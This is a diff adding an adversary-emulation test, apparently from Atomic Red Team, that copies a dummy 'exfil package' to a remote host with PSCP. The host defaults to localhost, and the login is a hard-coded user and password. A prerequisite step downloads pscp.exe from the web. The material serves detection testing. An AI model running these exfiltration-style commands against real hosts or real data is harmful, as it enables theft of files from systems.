@@ -920,3 +920,59 @@ atomic_tests:
     cleanup_command:  rm "#{local_file_path}" 2>$null | Out-Null
     name: powershell
     elevation_required: true
+- name: Remote File Copy using PSCP
+  auto_generated_guid: c82b1e60-c549-406f-9b00-0a8ae31c9cfe
+  description: |
+    Copy a staged file using PSCP.exe to a public target location.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pscp_url:
+      description: pscp.exe download path
+      type: string
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
+    pscp_binary:
+      description: PSCP binary location
+      type: string
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\pscp.exe'
+    scp_user:
+      description: Username of the SCP user
+      type: string
+      default: 'atomic'
+    scp_password:
+      description: Password for the SCP User
+      type: string
+      default: 'atomic'
+    scp_port:
+      description: port for the remote server
+      type: string
+      default: '22'
+    exfil_package:
+      description: path to exfil package
+      type: path
+      default: 'C:\Temp\T1105_scp.zip'
+    target_location:
+      description: Remote location where the data will be copied to.
+      type: string
+      default: 127.0.0.1
+    target_filename:
+      description: Filename on the destination.
+      type: string
+      default: T1105_scp.zip    
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      pscp.exe must be available on the system.
+    prereq_command: |
+      if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "#{pscp_url}" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\pscp.exe"
+  executor:
+    command: |
+      fsutil file createnew C:\Temp\T1105_scp.zip 1048576
+      echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
+    cleanup_command: |
+      del /f /q #{exfil_package}
+    name: command_prompt
+    elevation_required: false
